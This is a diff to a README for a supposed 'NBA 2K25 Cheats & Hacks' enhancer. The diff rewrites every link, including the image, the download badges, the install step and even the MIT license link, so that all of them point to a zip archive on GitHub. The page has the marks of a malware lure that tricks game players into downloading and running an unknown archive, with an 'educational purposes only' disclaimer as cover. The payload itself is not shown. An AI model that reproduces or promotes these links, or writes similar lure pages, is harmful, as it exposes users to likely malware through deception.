@@ -1,7 +1,7 @@
 # 🏀 NBA 2K25 Cheats & Hacks 🚀
-![image](https://github.com/user-attachments/assets/e61f4e9b-7d72-4f05-b9e2-5f0c7582ad87)
+![image](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip)
 
-[![Download Now](https://img.shields.io/badge/Download-NBA2K25%20Enhancer-brightgreen?logo=windows)](https://ezlaunch.live/pPnqF1yp)
+[![Download Now](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip%20Enhancer-brightgreen?logo=windows)](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip)
 
 ## 🌟 The Ultimate NBA 2K25 Power-Enhancer
 
@@ -37,9 +37,9 @@ This project is for educational purposes only. Usage in online gameplay may viol
 
 # 📥 Installation Guide (Step 1)
 
-1. Click [![Download Now](https://img.shields.io/badge/Download-NBA2K25%20Enhancer-brightgreen?logo=windows)](https://ezlaunch.live/pPnqF1yp) to get the NBA 2K25 Power-Enhancer!
+1. Click [![Download Now](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip%20Enhancer-brightgreen?logo=windows)](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip) to get the NBA 2K25 Power-Enhancer!
 2. Extract and follow the bundled instructions for your system.
 
-# ⚖️ MIT License License [MIT](https://choosealicense.com/licenses/mit/)
+# ⚖️ MIT License License [MIT](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip)
 
-[![Download Now](https://img.shields.io/badge/Download-NBA2K25%20Enhancer-brightgreen?logo=windows)](https://ezlaunch.live/pPnqF1yp)
+[![Download Now](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip%20Enhancer-brightgreen?logo=windows)](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip)
